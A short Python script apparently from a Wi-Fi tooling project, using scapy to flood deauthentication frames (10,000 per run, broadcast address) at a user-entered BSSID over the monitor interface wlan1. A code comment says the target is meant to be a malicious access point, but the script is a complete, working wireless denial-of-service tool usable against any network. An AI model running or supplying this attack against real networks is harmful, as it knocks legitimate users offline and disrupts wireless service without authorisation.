#!/usr/bin/python3


from scapy.all import *
import sys
import wifi
from menus import *
import menus
#~~~~~~~~~~~~~~~ METHODS ~~~~~~~~~~~~~~~~~~~~~~~
def deauth() :
	while True:
		bssid= input('please insert the broadcast to deauthenticate: '.center(w-100))       #input for the SSID to deauthenticate ( MUST BE THE MALICIOUS ONE )
		if bssid in ['exit','quit','back','home']:                                          #check if user wants to exit
			menus.cleanup()
			break
		broadcaster = "ff:ff:ff:ff:ff:ff"                                                   #set the broadcaster usually all the slots are 1 in binary 
		pack = RadioTap() / Dot11( addr1 = broadcaster, addr2 = bssid, addr3 = bssid)/ Dot11Deauth()   #the packet to send using scapy we are able to  do11deuth() giving the braodcaster ssid and the bssid as addr2 and addr3
		sendp(pack, iface = "wlan1", count = 10000, inter = .2)                             #send packets in the second layer, using the monitor interface wlan1 with an interval of .2 s
	exit

def logo():
	tprint('  Disconnect... '.center(w-70))                                                 #print a disconnect.. sign
#~~~~~~~~~~~~~~~~~~ MAIN ~~~~~~~~~~~~~~~~~~~~~~~
if __name__ == '__main__' :
	logo()
	wifi.wifi_check()
	deauth()
	



        
